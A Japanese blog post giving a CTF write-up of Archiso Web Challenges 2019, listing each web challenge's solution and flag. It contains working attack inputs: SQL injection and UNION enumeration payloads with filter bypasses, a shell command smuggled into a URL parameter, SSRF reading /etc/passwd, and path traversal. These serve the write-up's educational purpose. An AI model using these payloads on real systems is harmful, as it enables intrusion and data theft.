---
layout: post
title: Archiso Web Challenges 2019 の write-up
categories: [ctf]
date: 2019-12-29 13:00:00 +0900
---

12 月 28 日から 12 月 29 日にかけて開催された Web 問オンリーの CTF (!) である [Archiso Web Challenges 2019](https://awebc19.archiso.dev/) に、ひとりチーム st98 として参加しました。最終的に全ての問題を解いて 3750 点を獲得し、順位は得点 33 チーム中 1 位でした。

以下、解いた問題の write-up です。

## [Welcome 50] Welcome to AWebC19
> **Archiso Web Challenges 2019へようこそ！**
> 本大会では以下の行為を禁止しております。
> 
> - サーバに対し必要以上の負荷を掛けること
> - 他者に問題の解答を教えること
> - Twitter等のSNS上で問題のネタバレをすること
> - その他よろしくない行為
> 
> 基本的なWeb問を取り揃えました。是非楽しんでください！
> フラグは `WebC{W3lcome_t0_Archis0_We6_Cha1lenges_2019_6cd97dcc}` です！

```
WebC{W3lcome_t0_Archis0_We6_Cha1lenges_2019_6cd97dcc}
```

## [Web 100] Out of Display
> ディスプレイ上にフラグはないよ!
> 
> (URL)

与えられた URL にアクセスすると問題文と同じ文章が表示されました。HTML を見てみましょう。

```html
<!DOCTYPE html>
<html>

<head>
  <title>Out Of Display</title>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/milligram/1.3.0/milligram.css">
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div id="main" class="container">
    <h1>Out of Display</h1>
    <p>ディスプレイ上にフラグはないよ!</p>
    <!-- WebC{0ops_y0u_c4n_find_m3_8356eb46} -->
  </div>
</body>

</html>
```

フラグが得られました。

```
WebC{0ops_y0u_c4n_find_m3_8356eb46}
```

## [Web 100] Whited Out
> だから画面の中にフラグはないの。本当だよ？
> 
> (URL)

今度も与えられた URL にアクセスしてもフラグは表示されません。HTML を見てみましょう。

```html
<!DOCTYPE html>
<html>

<head>
  <title>Whited Out</title>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div id="main">
    <h1>Whited Out</h1>
    <p>だからフラグはないの。本当だよ？</p>
    <p style="color: white">WebC{7his_f1ag_i5_whit3d_0ut_0d856efe}</p>
  </div>
</body>

</html>
```

フラグが得られました。

```
WebC{7his_f1ag_i5_whit3d_0ut_0d856efe}
```

## [Web 100] Rel
> link要素を用いることでスタイルシートをリンクすることができます。
> 
> (URL)

今度もやはり与えられた URL にアクセスしてもフラグは表示されません。HTML を見てみましょう。

```html
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>rel</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/milligram/1.3.0/milligram.css">
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div id="main" class="container">
    <h1>rel</h1>
    <p>You can link stylesheet by <span class="red">link</span> element.</p>
  </div>
</body>

</html>
```

問題名に従って、`link` 要素で参照されているスタイルシートの `style.css` を見てみます。

```css
/* WebC{sty1esh3et5_c4n_be_1ink3d_6y_re1_4ttribu7e_192ecb0e} */

#main {
  text-align: center;
}

.red {
  color: red;
}
```

フラグが得られました。

```
WebC{sty1esh3et5_c4n_be_1ink3d_6y_re1_4ttribu7e_192ecb0e}
```

## [Web 200] Ref
> あなたはどこから来ましたか？
> 
> (URL)

与えられた URL にアクセスすると `Google検索(https://www.google.com/)からこのサイトにアクセスしてください。` と表示されました。`curl` で `Referer` ヘッダをいじってアクセスしてみましょう。

```
$ curl -H "Referer: https://www.google.com/" (URL)
<!DOCTYPE html><html><head><meta charset="UTF-8"/><title>Ref</title><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.css"/><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/milligram/1.3.0/milligram.css"/><link rel="stylesheet" href="style.css"/></head><body><div class="container" id="main"><h1>Ref</h1><p>Google検索(https://www.google.com/)からこのサイトにアクセスしてください。</p><a href="https://www.google.com/" target="new">Google検索</a><p>Congrats! Flag is WebC{N0w_you_acc3ssed_7his_sit3_fr0m_go0g1e_0ec9b975}</p></div></body></html>
```

フラグが得られました。

```
WebC{N0w_you_acc3ssed_7his_sit3_fr0m_go0g1e_0ec9b975}
```

## [Web 200] Agent
> 我々の道具であり、手先である。
> 
> (URL)

与えられた URL にアクセスすると `NCSA Mosaicのバージョン2.0からアクセスしてください。` と表示されました。`curl` でユーザエージェントをいじってアクセスしてみましょう。

```
$ curl -A "NCSA Mosaicのバージョン2.0" (URL)
<!DOCTYPE html><html><head><meta charset="UTF-8"/><title>Agent</title><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.css"/><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/milligram/1.3.0/milligram.css"/><link rel="stylesheet" href="style.css"/></head><body><div class="container" id="main"><h1>Agent</h1><p>NCSA Mosaicのバージョン2.0からアクセスしてください。</p><p>Congrats! Flag is WebC{D0_y0u_s7ill_u5e_Wind0ws_3.1_in_thi5_c3ntury?_cc6efe69}</p></div></body></html>
```

フラグが得られました。

```
WebC{D0_y0u_s7ill_u5e_Wind0ws_3.1_in_thi5_c3ntury?_cc6efe69}
```

## [Web 300] Oluri Key
> オオルリはかわいい、Cyber研究会の門番。
> 
> (URL)

与えられた URL にアクセスするとユーザ ID とパスワードを入力できるログインフォームが表示されました。ログインフォームと聞いてまず疑うのは SQLi です。ユーザ ID に `' or 1;#` を入力するとフラグが得られました。

```
WebC{N0w_y0u_c4n_l0gin_to_0ur_k3y_sys7em_0e789551}
```

## [Web 300] Fruits List
> 季節ごとのフルーツの一覧が見られます！
> 
> (URL)

与えられた URL にアクセスすると、以下のようなソースコードへのリンクがありました。

```php
<?php
if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit;
}
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>Fruits List</title>
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/milligram/1.3.0/milligram.css">
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div id="main" class="container">
    <h1>Fruits List</h1>
    <h3>Please choose a season you like!</h3>
    <p>You can see source code from <a href="index.php?source">here</a>!</p>

    <a href="index.php?season=spring">Spring</a>
    <a href="index.php?season=summer">Summer</a>
    <a href="index.php?season=autumn">Autumn</a>
    <a href="index.php?season=winter">Winter</a>

    <ul id="fruitsList">
      <?php if (isset($_GET['season'])): ?>
      <?php
          $fruits = array_filter(explode("\n", shell_exec("ls {$_GET['season']}")), "strlen");
          foreach ($fruits as $fruit):
        ?>
      <li><?php echo urlencode(trim($fruit)); ?></li>
      <?php endforeach; ?>
      <?php endif; ?>
    </ul>
  </div>
</body>

</html>
```

`shell_exec("ls {$_GET['season']}")` で OS コマンドインジェクションができそうです。`?season=1;%20ls%20/` にアクセスすると以下のようなレスポンスが返ってきました。

```html
︙
    <ul id="fruitsList">
                  <li>WebC%7BY0u_c4n_choo5e_frui7s_with_y0ur_f4vorite_season%21_b5d3a864%7D</li>
            <li>bin</li>
            <li>dev</li>
            <li>etc</li>
            <li>home</li>
            <li>lib</li>
            <li>media</li>
            <li>mnt</li>
            <li>opt</li>
            <li>proc</li>
            <li>root</li>
            <li>run</li>
            <li>sbin</li>
            <li>srv</li>
            <li>sys</li>
            <li>tmp</li>
            <li>usr</li>
            <li>var</li>
                </ul>
︙
```

フラグが得られました。

```
WebC{Y0u_c4n_choo5e_frui7s_with_y0ur_f4vorite_season!_b5d3a864}
```

## [Web 400] Single Page HTML Viewer 2
> HTMLファイルの中身を見ることができるシングルページアプリケーションを改良しました！  
> 今度は外部サーバのページも表示できますよ！  
> 当然脆弱性はありません！当たり前です！
> 
> (URL)

与えられた URL にアクセスすると、`※フラグへのアクセスは遮断されます` との注釈付きで URL の入力フォームが表示されました。とりあえず `https://example.com` を入力してみると、以下のような HTML が表示されました。

```html
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
</div>
```

入力した URL にアクセスして返ってきたコンテンツをそのまま表示するようです。ローカルのファイルにアクセスさせることができないか `file:///etc/passwd` を入力すると以下のように表示されました。

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
```

続いて `file:///flag` も試してみましたが `不正なアクセスを検出しました` と怒られてしまいました。どういうことかこのページで読み込まれているスクリプトの `main.js` を見てみましょう。

```javascript
$(function () {
  $('#submit-button').on('click', function () {
    const url = $('#url-input').val()

    $('#error').html('')
    $('#error').removeClass('error')

    $('#url-input').val('')
    $('#content').html('')

    if (!url) {
      $('#error').addClass('error')
      $('#error').html('<p>URLが入力されていません</p>')

      return false
    }

    if (url.match(/flag/)) {
      $('#error').addClass('error')
      $('#error').html('<p>不正なアクセスを検出しました</p>')

      return false
    }

    const params = new URLSearchParams()
    params.append('url', url)

    axios.post('query.php', params)
      .then(function (res) {
        if (!res.data.error) {
          $('#content').html(res.data.content)
        } else {
          $('#error').addClass('error')
          $('#error').append('<p>' + res.data.error + '</p>')
        }
      })
      .catch(function (err) {
        $('#error').addClass('error')
        $('#error').append('<p>通信に失敗しました</p>')
        console.log(err)
      })

    return false
  })
})
```

`url.match(/flag/)` が真となる場合には指定した URL のコンテンツを取ってくる API が叩かれないようです。DevTools の Console で `String.prototype.match = () => false` を実行してこれが必ず偽を返すようにした上で、再度 `file:///flag` を入力するとフラグが得られました。

```
WebC{Y0u_c4n_acc3ss_secur3_inform4tions_6y_usin9_s3rver_5ide_reques7_forg3ry_c9e4858a}
```

## [Web 500] Go Mikuji
> Go言語でおみくじを作りました！  
> 是非来年の運勢を占ってみてください！
> 
> (URL)
> 
> 添付ファイル: problem.zip (ソースコード)

`problem.zip` に含まれる `main.go` は以下のような内容でした。

```go
package main

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
)

func main() {
	cwd, err := os.Getwd()

	if err != nil {
		log.Fatal(err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		name := filepath.FromSlash(filepath.Join(cwd, "public", path.Base(r.URL.Path)))
		path := strings.Replace(name, "\\", "/", -1)
		f, err := os.Open(path)

		if err != nil {
			http.NotFound(w, r)
			return
		}

		defer f.Close()
		io.Copy(w, f)
	})

	http.HandleFunc("/public/omikuji", func(w http.ResponseWriter, r *http.Request) {
		results := []string{"大吉", "中吉", "小吉", "凶", "大凶"}
		fmt.Fprintf(w, "<html><head><title>Go Mikuji | Fortune</title><meta charset=\"utf-8\"></head><body><h1>Go Mikuji</h1><p>Today's fortune: %s</p></body></html>", results[rand.Intn(len(results))])
	})

	http.ListenAndServe(":8080", nil)
}
```

`path := strings.Replace(name, "\\", "/", -1)` と大変怪しげな処理をしています。`main.go` と同じディレクトリに `flag.txt` があるようなので、これを利用して読み出せないか試してみましょう。

```
$ curl (省略)/..%5cflag.txt
WebC{pa7h_p4ckage_hand1e_fil3_p4th_4s_l0gical_p4th_9bfe7b26}
```

フラグが得られました。

```
WebC{pa7h_p4ckage_hand1e_fil3_p4th_4s_l0gical_p4th_9bfe7b26}
```

## [Web 400] Dolls Data 1
> ドールズフロントラインの戦術人形のデータベースを作りました！  
> 是非利用してみてください！
> 
> (URL)

与えられた URL にアクセスすると、次のような検索フォームが表示されました。

```html
︙
    <div class="form-wrapper">
      <select id="search-option">
        <option value="id">ID</option>
        <option value="rarity">レア度</option>
        <option value="type">種別</option>
        <option value="name">戦術人形名</option>
      </select>
      <input id="search-input" type="text" placeholder="検索したい文字列を入力してください">
      <button id="search-button" type="submit">送信</button>
      <button id="reset-button" type="reset">リセット</button>
    </div>
︙
```

検索フォームといえば SQLi です。`' or 1;#` を検索してみると全てのレコードが表示され、`' and 0;#` だと `該当するデータが存在しません` と表示されました。

`' union select 1,2,3,4,5,6,7,8,9,10,11;#` を入力してみると、以下のようなテーブルが表示されました。

|ID|レア度|種別|戦術人形名|
|--|---|--|-----|
|1|2|3|4|

これを利用して存在しているテーブルの一覧を手に入れましょう。`' union select version(),2,3,4,5,6,7,8,9,10,11;#` を入力すると `8.0.18` と表示されることから MySQL が使われていると推測できます。`' union select 1,2,3,table_name,5,6,7,8,9,10,11 from information_schema.tables;#` を入力すると、以下のようなテーブルが表示されました。

|ID|レア度|種別|戦術人形名|
|--|---|--|-----|
|1|2|3|dolls|
|1|2|3|dolls_data_1_flag_b3f4befc|
|︙|︙|︙|︙|

`dolls_data_1_flag_b3f4befc` のカラム名を取得します。`' union select 1,2,3,column_name,5,6,7,8,9,10,11 from information_schema.columns where table_name = 'dolls_data_1_flag_b3f4befc';#` を入力すると、以下のようなテーブルが表示されました。

|ID|レア度|種別|戦術人形名|
|--|---|--|-----|
|1|2|3|kar98k|

`' union select 1,2,3,kar98k,5,6,7,8,9,10,11 from dolls_data_1_flag_b3f4befc;#` を入力すると、以下のようなテーブルが表示されました。

|ID|レア度|種別|戦術人形名|
|--|---|--|-----|
|1|2|3|WebC{D0lls_front1ine_i5_v3ry_nic3_g4me!_Y0u_mu5t_p1ay_i7_n0w!_d10e093d}|

フラグが得られました。

```
WebC{D0lls_front1ine_i5_v3ry_nic3_g4me!_Y0u_mu5t_p1ay_i7_n0w!_d10e093d}
```

## [Web 500] Dolls Data 2
> さっきのシステムには脆弱性があったので、修正しました！
使わなきゃいけない記号があるので、それは使えるようにしています！
> 
> (URL)

脆弱性が修正されたとのことですが、`' or 1;#` と `' and 0;#` の挙動を見ると相変わらず SQLi ができるようです。ところが、 `' union select 1,2,3,4,5,6,7,8,9,10,11;#` を入力しても `処理中にエラーが発生しました` と表示されます。入力フォームをよく見ると `,` が消されてしまっているようです。DevTools の Network タブを見るとちゃんと `' union select 1,2,3,4,5,6,7,8,9,10,11;#` が送信されていることが確認でき、クライアント側で処理されているわけではないことがわかります。

`,` が消された状態での SQLi と聞いて思い出すのは [SECCON 2019 Online CTF の web_search](2019-10-20-seccon-online-ctf.html#web_search-web-212) です。これと同じ手法を用いて `' union select * from (select 1) a join (select 2) b join (select 3) c join (select 4) d join (select 5) e join (select 6) f join (select 7) g join (select 8) h join (select 9) i join (select 10) j join (select 11) k;#` を入力してみると、以下のようなテーブルが表示されました。

|ID|レア度|種別|戦術人形名|
|--|---|--|-----|
|1|2|3|4|

あとは `Dolls Data 1` と同じ要領でテーブル名とカラム名を取得し、フラグの格納されているテーブルのレコードを取得するとフラグが得られました。

```
WebC{404_s9uad_c0nsi5ts_0f_UMP45_UMP9_GrG11_4nd_416_702e53df}
```

## [Web 600] Dolls Data 3
> さっきのシステムには実装ミスがあったので、さらに修正しました！  
> 今度こそ完璧です！
> 
> (URL)

やはり SQLi が残っています。今度はスペース (`U+0020`) が 削除されるようですが、これは `/**/` (MySQL のコメント) で代替できます。

あとは`Dolls Data 2` と同じ要領でテーブル名とカラム名を取得し、フラグの格納されているテーブルのレコードを取得するとフラグが得られました。

```
WebC{Con9ratu1ati0ns!_Y0u_ar3_7he_tru1y_m4ster_0f_SQL_inj3ction!_7a5c9318}
```